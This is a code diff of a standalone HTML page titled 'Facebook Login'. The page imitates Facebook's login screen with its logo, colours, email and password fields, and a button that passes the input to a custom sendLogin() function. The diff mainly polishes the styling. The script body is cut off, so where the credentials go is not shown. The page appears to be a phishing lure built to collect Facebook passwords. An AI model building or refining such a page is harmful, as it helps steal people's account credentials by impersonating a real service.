@@ -5,23 +5,67 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #f0f2f5; padding: 50px; }
-        .login-box { width: 320px; margin: auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px #ccc; }
-        input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { background-color: #1877F2; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; cursor: pointer; }
-        button:hover { background-color: #145DBF; }
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            background: #f0f2f5; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .logo {
+            width: 50px;
+            margin-bottom: 10px;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #1877F2;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #145DBF;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1877F2;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
-       <div class="login-container">
+    <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
         <input type="email" id="email" placeholder="Mobile number or email address">
         <input type="password" id="password" placeholder="Password">
         <button onclick="sendLogin()">Log in</button>
         <p class="forgot-password">Forgotten password?</p>
     </div>
-
 
     <script>
         function sendLogin() {
